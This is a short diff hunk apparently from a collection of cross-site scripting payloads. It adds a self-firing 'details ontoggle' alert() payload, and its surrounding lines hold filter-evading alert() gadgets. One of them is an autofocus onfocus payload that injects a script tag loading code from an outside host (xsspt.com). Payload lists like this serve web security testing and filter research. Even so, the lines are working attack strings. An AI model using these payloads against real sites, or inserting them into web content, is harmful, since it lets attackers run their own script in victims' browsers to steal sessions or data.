@@ -75,8 +75,9 @@ content['alert'](6)
 [11].findIndex(alert)
 [12].forEach(alert);
  
+<details open ontoggle=[1].map(alert)>
 <keygen autofocus onfocus=s=createElement("scriPt");body.appendChild(s);s.src="//xsspt.com/JUvhKT">
- 
+
  
   
 ```
